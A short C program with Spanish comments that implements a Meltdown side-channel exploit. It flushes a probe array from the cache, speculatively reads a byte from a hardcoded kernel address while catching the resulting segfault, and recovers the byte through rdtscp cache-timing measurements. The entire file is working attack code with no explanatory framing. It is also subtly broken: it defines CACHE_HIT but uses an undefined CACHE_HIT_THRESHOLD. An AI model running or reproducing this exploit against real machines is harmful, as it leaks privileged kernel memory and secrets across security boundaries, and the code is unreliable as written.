#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <unistd.h>
#include <stdlib.h>

#define CACHE_HIT 80  

static sigjmp_buf bufaux;
static char probe_array[256 * 4096];

// Manager para SIGSEGV
void segfault_handler(int sig) {
    siglongjmp(bufaux, 1);
}

// Flush de la cache
void flush_probe_array() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
}

// Mide el tiempo de acceso a una dirección
int measure_access_time(int index) {
    uint64_t start, end;
    volatile uint8_t *addr = &probe_array[index * 4096];

    start = __rdtscp(&index);
    (void)*addr;
    end = __rdtscp(&index);

    return end - start;
}

uint8_t meltdown(uint8_t *target_addr) {
    signal(SIGSEGV, segfault_handler);  // Activamos el manager para SIGSEV

    while (1) {
        flush_probe_array();
        _mm_mfence();

        if (sigsetjmp(bufaux, 1) == 0) {
            uint8_t value = *target_addr;
            probe_array[value * 4096] += 1; // acceso especulativo
        }

        // Medimos los tiempos para ver qué índice ha sido cacheado
        for (int i = 0; i < 256; i++) {
            int time = measure_access_time(i);
            if (time < CACHE_HIT_THRESHOLD) {
                return (uint8_t)i;
            }
        }
    }
}

int main() {
    // Cambia esto por alguna dirección prohibida (requiere ejecución con privilegios o kernel vulnerable)
    uint8_t *kernel_addr = (uint8_t*)0xffffffffff000000;

    uint8_t secreto = meltdown(kernel_addr);
    printf("Valor encontrado: 0x%02x (%c)\n", secreto, secreto);

    return 0;
}
